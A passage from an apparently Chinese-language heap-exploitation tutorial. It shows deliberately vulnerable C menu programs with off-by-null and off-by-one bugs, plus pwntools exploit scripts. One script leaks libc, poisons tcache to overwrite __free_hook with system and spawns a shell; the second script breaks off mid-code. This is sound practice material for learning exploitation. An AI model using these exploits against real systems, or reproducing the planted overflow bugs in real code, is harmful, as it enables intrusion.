function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    buf[read(<span class="hljs-number">0</span>,buf,size_list[ind])]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;     <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="off-by-null-示例分析">off by null 示例分析</h3><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp 思路</span><br><span class="hljs-string">    先获取chunk地址，然后构造chunk内容</span><br><span class="hljs-string">    并利用edit函数中的off by null 将下一个chunk的inuse位设置为0</span><br><span class="hljs-string">    这时将下一个chunk释放就会导致下一个chunk与当前chunk合并</span><br><span class="hljs-string">    然后放入unsorted bin中</span><br><span class="hljs-string">    这里面需要绕过unlink的检测，所以需要一个可控的空间地址</span><br><span class="hljs-string">    使 chunk-&gt;fd-&gt;bk=chunk  chunk-&gt;bk-&gt;fd=chunk</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        在已知chunk相对于heap段的偏移时，</span><br><span class="hljs-string">        可以获取heap段地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;obn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x438</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x4f8</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>show(<span class="hljs-number">1</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap3=calc_fd(heap_d,<span class="hljs-number">0xc40</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap3))<br>heap2=heap3-<span class="hljs-number">0x500</span><br>heap1=heap2-<span class="hljs-number">0x60</span><br>tcache_bin=heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x10</span><br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br>payload=p64(heap1)*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">3</span>,payload)<br>payload=p64(heap3)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>show(<span class="hljs-number">1</span>)<br>list_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=list_d-<span class="hljs-number">0x4a0</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">1</span>,p64(en_fd(heap1+<span class="hljs-number">0x10</span>,free_hook)))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">6</span>,p64(system))<br>free(<span class="hljs-number">5</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="off-by-one">off by one</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    构造payload，将后一个chunk的size设置为足够包含与其相邻的后一个chunk</span><br><span class="hljs-comment">    构造size 足够放入unsorted bin</span><br><span class="hljs-comment">    通过调用malloc时使其分裂，还原heap</span><br><span class="hljs-comment">    这时在与其相邻的后一个chunk，会出现在程序的chunk列表中，也会出现在bin中</span><br><span class="hljs-comment">    这样就可以修改bin的结构</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc obo.c -o obo</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_data</span><span class="hljs-params">(<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> len)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;=len;i++)&#123;<br>        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>              <span class="hljs-keyword">return</span>;<br>        data[i]=buf[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    get_data(buf,size_list[ind]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="off-by-one-示例分析">off by one 示例分析</h3><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><strong>get_data函数代码</strong><br><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-5.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    利用get_data中可以多写入一个字节的漏洞，</span><br><span class="hljs-string">    可以修改下一个chunk的size字段的第一个字节</span><br><span class="hljs-string">    就可以构造payload使两个chunk合并，释放之后，将其放入large bin中</span><br><span class="hljs-string">    来获取libc地址，然后获取chunk地址来构造tcache bin的结构</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span 